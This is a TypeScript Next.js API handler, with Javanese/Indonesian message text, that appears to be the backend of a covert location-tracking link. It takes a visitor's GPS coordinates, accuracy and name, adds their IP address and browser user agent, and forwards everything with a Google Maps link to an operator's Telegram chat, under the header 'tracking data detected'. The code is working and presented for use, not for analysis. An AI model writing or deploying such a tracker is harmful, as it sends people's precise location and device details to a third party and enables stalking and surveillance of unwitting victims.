import type { NextApiRequest, NextApiResponse } from 'next';

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method Not Allowed' });
  }

  const { lat, lon, acc, nama } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const userAgent = req.headers['user-agent'];

  const botToken = process.env.TELEGRAM_BOT_TOKEN!;
  const chatId = process.env.TELEGRAM_CHAT_ID!;

  const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;

  const message = `
📥 *Mass enek...Data Pelacakan Terdeteksi*

👤 *Jeneng:* ${nama}
🖥️ *Perangkat:* ${userAgent}
🌐 *IP Address:* ${ip}
📍 *Lokasi:*
- Latitude: ${lat}
- Longitude: ${lon}
- Akurasi: ${acc} meter

🔗 [Lihat di Google Maps](${mapUrl})
`;

  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

  await fetch(telegramUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown'
    })
  });

  res.status(200).json({ message: 'Data dikirim ke Telegram' });
}
